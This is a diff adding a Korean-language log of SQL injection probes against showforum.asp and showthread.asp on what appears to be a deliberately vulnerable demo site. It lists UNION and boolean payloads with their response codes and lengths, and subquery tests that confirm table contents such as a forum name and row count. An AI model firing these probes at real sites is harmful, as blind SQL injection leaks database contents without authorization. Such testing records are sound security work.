@@ -1,0 +1,25 @@
+### 소스 기반 UNION/서브쿼리 재확인 (showforum.asp?id=)
+  기준 1                                                             -> 200 3077
+  기준 0                                                             -> 200 3770
+  1 AND 1=1                                                        -> 200 3117
+  2컬럼 UNION (주석 없음)                                                -> 500 1208
+  2컬럼 UNION --                                                     -> 500 1208
+  2컬럼 UNION -- 뒤 공백                                                -> 500 1208
+  2컬럼 UNION ALL --                                                 -> 500 1208
+  0 UNION 2컬럼 --                                                   -> 500 1208
+  0 UNION 'a','b' --                                               -> 500 1208
+  0 UNION name,descr FROM forums --                                -> 500 1208
+  문자열 컬럼 추정                                                        -> 500 1208
+  UNION 뒤 세미콜론                                                     -> 500 1208
+  3컬럼                                                              -> 500 1208
+  서브쿼리로 확인: AND (SELECT name FROM forums WHERE id=1) IS NOT NULL   -> 200 3287
+  AND (SELECT COUNT(*) FROM forums)=3                              -> 200 3237
+  AND (SELECT name FROM forums WHERE id=1)='Weather'               -> 200 3283
+  AND (SELECT name FROM forums WHERE id=1)='Acunetix Web Vulnerability Scanner' -> 500 1208
+
+### 같은 실험을 showthread.asp 에서 (쿼리: SELECT b.title, b.forumid, b.id as threadid, a.name FROM forums a, threads b WHERE ... b.id=<n>  → 4컬럼)
+  기준 0                                                             -> 200 3031
+  4컬럼 UNION --                                                     -> 500 1208
+  4컬럼 UNION ALL --                                                 -> 500 1208
+  AND 1=1                                                          -> 200 3071
+  AND 1=2                                                          -> 500 1208
